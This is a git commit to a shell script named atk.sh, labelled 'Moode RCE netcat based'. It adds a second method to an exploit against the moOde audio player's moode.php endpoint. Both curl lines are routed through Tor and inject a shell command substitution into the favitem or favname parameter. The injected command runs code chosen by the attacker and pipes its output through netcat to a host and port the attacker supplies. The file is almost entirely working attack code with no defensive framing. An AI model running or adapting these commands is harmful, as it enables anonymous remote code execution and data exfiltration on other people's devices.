3e741a36d53e3aaa4d95d4cd618d1ed018a50eeb
Ug0Security <c.vallicari@gmail.com>
2021-04-24 22:30:32 +0200

    Update atk.sh

--- atk.sh
+++ atk.sh
@@ -1,3 +1,8 @@
 echo "Moode RCE netcat based"
 
+echo "methode 1"
 torify curl -X POST "$1/command/moode.php?cmd=addfav&favitem=\$($2 | nc $3 $4)"
+
+
+echo "methode 2"
+torify curl -X POST "$1/command/moode.php?cmd=setfav&favname=\$($2 | nc $3 $4)"
